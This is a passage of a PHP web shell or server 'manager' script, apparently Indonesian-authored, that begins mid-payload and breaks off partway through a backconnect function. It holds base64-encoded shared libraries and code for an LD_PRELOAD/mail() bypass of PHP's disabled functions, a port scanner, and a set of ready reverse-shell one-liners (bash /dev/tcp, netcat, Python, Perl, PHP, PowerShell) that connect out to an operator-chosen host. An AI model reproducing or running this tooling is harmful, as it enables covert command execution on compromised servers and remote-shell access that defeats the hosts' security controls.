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AAAAAAAAAAAAAAAAAAAAGQAAAAEAAAAAgAAAAAAAADQBAAAAAAAANAEAAAAAAAA8AAAAAAAAAADAAAAAAAAAAgAAAAAAAAAGAAAAAAAAABuAAAABAAAAEIAAAAAAAAAwAUAAAAAAADABQAAAAAAAHgAAAAAAAAAAwAAAAoAAAAIAAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAADgGAAAAAAAAOAYAAAAAAAAaAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAABgBgAAAAAAAGAGAAAAAAAAYAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwAYAAAAAAADABgAAAAAAAJ0BAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAhAAAAAEAAAAGAAAAAAAAAGAIAAAAAAAAYAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIoAAAABAAAAAgAAAAAAAABpCAAAAAAAAGkIAAAAAAAAGAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAACSAAAAAQAAAAIAAAAAAAAAhAgAAAAAAACECAAAAAAAABwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAoAAAAAEAAAACAAAAAAAAAKAIAAAAAAAAoAgAAAAAAABkAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAKoAAAAOAAAAAwAAAAAAAAAICSAAAAAAAAgJAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAC2AAAADwAAAAMAAAAAAAAAGAkgAAAAAAAYCQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAwgAAAAEAAAADAAAAAAAAACAJIAAAAAAAIAkAAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAMcAAAAGAAAAAwAAAAAAAAAoCSAAAAAAACgJAAAAAAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAADQAAAAAQAAAAMAAAAAAAAA6AogAAAAAADoCgAAAAAAADAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAAEAAAADAAAAAAAAABgLIAAAAAAAGAsAAAAAAABAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN4AAAABAAAAAwAAAAAAAABYCyAAAAAAAFgLAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADkAAAACAAAAAMAAAAAAAAAYAsgAAAAAABgCwAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA6QAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAYAsAAAAAAAAkAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIQLAAAAAAAA8gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAB4DAAAAAAAAIgFAAAAAAAAGwAAACsAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAABIAAAAAAAAoAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==';
}

function geckoBypassPayload86()
{
    return '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';
}

function geckoBypassIs64bit()
{
    $int = '9223372036854775807';
    $int = intval($int);
    if ($int == 9223372036854775807) return true;
    if ($int == 2147483647) return false;
    return null;
}

function geckoBypassDisabledList()
{
    $raw = (string)@ini_get('disable_functions');
    $parts = preg_split('/\s*,\s*/', strtolower($raw), -1, PREG_SPLIT_NO_EMPTY);
    return is_array($parts) ? $parts : array();
}

function geckoBypassFuncOk($name)
{
    $name = strtolower((string)$name);
    if ($name === '') return false;
    if (!function_exists($name)) return false;
    return !in_array($name, geckoBypassDisabledList(), true);
}

/** Embedded payloads (dari preload.php) — self-contained di manager.php. */
function geckoBypassLoadPayloads()
{
    static $cache = null;
    if (is_array($cache)) return $cache;

    if (!function_exists('geckoBypassPayload64') || !function_exists('geckoBypassPayload86')) {
        $cache = array('ok' => false, 'error' => 'Payload embedded tidak tersedia di manager.php.');
        return $cache;
    }
    $so64 = geckoBypassPayload64();
    $so86 = geckoBypassPayload86();
    if ($so64 === '' || $so86 === '') {
        $cache = array('ok' => false, 'error' => 'Payload embedded kosong.');
        return $cache;
    }
    $cache = array(
        'ok' => true,
        'path' => 'embedded:manager.php',
        'so64' => $so64,
        'so86' => $so86,
    );
    return $cache;
}

function geckoBypassRun($cmd)
{
    $cmd = trim((string)$cmd);
    if ($cmd === '') {
        return array('ok' => false, 'error' => 'Command wajib diisi.');
    }
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        return array('ok' => false, 'error' => 'Bypass LD_PRELOAD hanya untuk Linux.');
    }

    $need = array('putenv', 'mail', 'file_put_contents', 'file_get_contents', 'unlink');
    $missing = array();
    foreach ($need as $fn) {
        if (!geckoBypassFuncOk($fn)) $missing[] = $fn;
    }
    if (!empty($missing)) {
        return array(
            'ok' => false,
            'error' => 'Fungsi wajib tidak tersedia / di-disable: ' . implode(', ', $missing),
            'disable_functions' => (string)@ini_get('disable_functions'),
        );
    }

    $arch = geckoBypassIs64bit();
    if ($arch === null) {
        return array('ok' => false, 'error' => 'Gagal deteksi arsitektur CPU (32/64-bit).');
    }

    $pay = geckoBypassLoadPayloads();
    if (empty($pay['ok'])) {
        return array(
            'ok' => false,
            'error' => isset($pay['error']) ? $pay['error'] : 'Payload gagal di-load.',
            'preload' => isset($pay['path']) ? $pay['path'] : '',
        );
    }

    $tmp = rtrim(str_replace('\\', '/', (string)sys_get_temp_dir()), '/');
    $uid = dechex((int)@getmypid()) . '_' . substr(md5(uniqid((string)mt_rand(), true)), 0, 8);
    $soPath = $tmp . '/gecko_bp_' . $uid . '.so';
    $outPath = $tmp . '/gecko_bp_' . $uid . '.out';

    $b64 = $arch ? $pay['so64'] : $pay['so86'];
    $bin = base64_decode($b64, true);
    if ($bin === false || $bin === '') {
        return array('ok' => false, 'error' => 'Payload .so corrupt / gagal decode.');
    }
    if (@file_put_contents($soPath, $bin) === false || !@is_file($soPath)) {
        return array('ok' => false, 'error' => 'Gagal tulis payload ke temp: ' . $soPath);
    }
    @chmod($soPath, 0755);

    $evil = $cmd . ' > ' . $outPath . ' 2>&1';
    $prevEvil = getenv('EVIL_CMDLINE');
    $prevLd = getenv('LD_PRELOAD');
    @putenv('EVIL_CMDLINE=' . $evil);
    @putenv('LD_PRELOAD=' . $soPath);

    $mailOk = false;
    try {
        // mail() → sendmail load LD_PRELOAD → jalankan EVIL_CMDLINE (sama seperti preload.php)
        $mailOk = @mail('a@localhost', '', '', '');
    } catch (Exception $ex) {
        $mailOk = false;
    } catch (Throwable $ex) {
        $mailOk = false;
    }

    if ($prevEvil === false || $prevEvil === null || $prevEvil === '') {
        @putenv('EVIL_CMDLINE');
    } else {
        @putenv('EVIL_CMDLINE=' . $prevEvil);
    }
    if ($prevLd === false || $prevLd === null || $prevLd === '') {
        @putenv('LD_PRELOAD');
    } else {
        @putenv('LD_PRELOAD=' . $prevLd);
    }

    $output = '';
    if (@is_file($outPath)) {
        $output = (string)@file_get_contents($outPath);
    }
    @unlink($outPath);
    @unlink($soPath);

    $df = (string)@ini_get('disable_functions');
    if ($output === '' && !$mailOk) {
        return array(
            'ok' => false,
            'error' => 'Tidak ada output. mail() mungkin gagal / sendmail tidak ada / LD_PRELOAD diblokir.',
            'arch' => $arch ? 'x86_64' : 'x86',
            'mail_ok' => false,
            'preload' => $pay['path'],
            'disable_functions' => $df,
            'output' => '',
        );
    }

    return array(
        'ok' => true,
        'cmd' => $cmd,
        'arch' => $arch ? 'x86_64' : 'x86',
        'mail_ok' => (bool)$mailOk,
        'preload' => $pay['path'],
        'disable_functions' => $df,
        'output' => $output !== '' ? $output : '(empty output — command may have run with no stdout)',
        'message' => 'Bypass LD_PRELOAD selesai (' . ($arch ? 'x86_64' : 'x86') . ')',
    );
}

function parsePortList($spec, $max = 500)
{
    $ports = array();
    foreach (explode(',', (string)$spec) as $part) {
        $part = trim($part);
        if ($part === '') continue;
        if (preg_match('/^(\d+)\s*-\s*(\d+)$/', $part, $m)) {
            $start = max(1, min(65535, (int)$m[1]));
            $end = max(1, min(65535, (int)$m[2]));
            if ($start > $end) { $t = $start; $start = $end; $end = $t; }
            for ($p = $start; $p <= $end && count($ports) < $max; $p++) {
                $ports[$p] = $p;
            }
        } elseif (preg_match('/^\d+$/', $part)) {
            $p = (int)$part;
            if ($p >= 1 && $p <= 65535 && count($ports) < $max) {
                $ports[$p] = $p;
            }
        }
    }
    return array_values($ports);
}

function scanPorts($host, $portsSpec, $timeout = 1)
{
    $host = trim((string)$host);
    if ($host === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $host)) {
        return array('ok' => false, 'error' => 'Invalid host');
    }
    $timeout = max(1, min(5, (int)$timeout));
    $ports = parsePortList($portsSpec, 500);
    if (empty($ports)) {
        return array('ok' => false, 'error' => 'No valid ports (e.g. 22,80,443 or 1-1024)');
    }
    $open = array();
    $ip = @gethostbyname($host);
    foreach ($ports as $port) {
        $conn = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if ($conn) {
            $open[] = (int)$port;
            fclose($conn);
        }
    }
    sort($open);
    return array('ok' => true, 'host' => $host, 'ip' => $ip, 'open' => $open, 'scanned' => count($ports));
}

/**
 * Start reverse/backconnect in background.
 * Never call exec()/system() directly — hosts often disable them (PHP 8 fatals → Empty HTTP 500).
 */
function startBackconnect($ip, $port, $method)
{
    $ip = trim((string)$ip);
    $port = (int)$port;
    $method = strtolower(trim((string)$method));
    if ($ip === '' || !preg_match('/^[a-zA-Z0-9.\-_]+$/', $ip)) {
        return array('ok' => false, 'error' => 'Invalid IP/hostname');
    }
    if ($port < 1 || $port > 65535) {
        return array('ok' => false, 'error' => 'Invalid port');
    }

    $isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
    $payloads = array(
        'bash'   => "bash -c 'bash -i >& /dev/tcp/{$ip}/{$port} 0>&1'",
        'nc'     => "rm -f /tmp/.bc;mkfifo /tmp/.bc;cat /tmp/.bc|/bin/sh -i 2>&1|nc {$ip} {$port} >/tmp/.bc",
        'python' => "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{$ip}\",{$port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        'perl'   => "perl -e 'use Socket;\$i=\"{$ip}\";\$p={$port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
        'php'    => "php -r '\$s=@fsockopen(\"{$ip}\",{$port});if(\$s){\$d=array(0=>\$s,1=>\$s,2=>\$s);\$p=null;@proc_open(\"/bin/sh -i\",\$d,\$p);}'",
    );
    if ($isWin) {
        $payloads['powershell'] = "powershell -nop -W hidden -c \"\$c=New-Object Net.Sockets.TCPClient('{$ip}',{$port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'> ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length)}\"";
        $payloads['nc'] = "nc.exe {$ip} {$port} -e cmd.exe";
    }
    if (!isset($payloads[$method])) {
        return array('ok' => false, 'error' => 'Unknown method: ' . $method);
    }

    $payload = $payloads[$method];
    $cwd = isset($GLOBALS['baseDir']) ? $GLOBALS['baseDir'] : (function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp');
    $shellMethod = '';

    // ── Windows: background via popen / proc_open (never bare exec) ──
    if ($isWin) {
        $winCmd = 'start /B ' . $payload;
        $launched = false;
        if (function_exists('popen') && function_exists('pclose')) {
            $h = @popen($winCmd, 'r');
            if (is_resource($h)) {
                @pclose($h);
                $launched = true;
                $shellMethod = 'popen';
            }
        }
        if (!$launched && function_exists('proc_open')) {
            $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
            $pipes = array();
            $proc = @proc_open('cmd /C ' . $winCmd, $desc, $pipes, $cwd);
            if (is_resource($proc)) {
                if (isset($pipes[0]) && is_resource($pipes[0])) fclose($pipes[0]);
                if (isset($pipes[1]) && is_resource($pipes[1])) fclose($pipes[1]);
                if (isset($pipes[2]) && is_resource($pipes[2])) fclose($pipes[2]);
                // Don't wait — detach
                @proc_close($proc);
                $launched = true;
                $shellMethod = 'proc_open';
            }
        }
        if (!$launched) {
            $fb = runTerminal($winCmd, $cwd, 5, true);
            if (!empty($fb['no_shell'])) {
                return array(
                    'ok' => false,
                    'error' => !empty($fb['output']) ? $fb['output'] : 'No shell runner for backconnect (Windows).',
                    'method' => $method,
                );
            }
            $shellMethod = isset($fb['method']) ? $fb['method'] : 'runTerminal';
            $launched = true;
        }
        return array(
            'ok' => true,
            'message' => 'Backconnect started (' . $method . ') → ' . $ip . ':' . $port,
            'shell_method' => $shellMethod,
            'target' => $ip . ':' . $port,
            'payload_method' => $method,
        );
    }

    // ── Linux/Unix: write payload script, launch with nohup in background ──
    $tmpDir = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '/tmp';
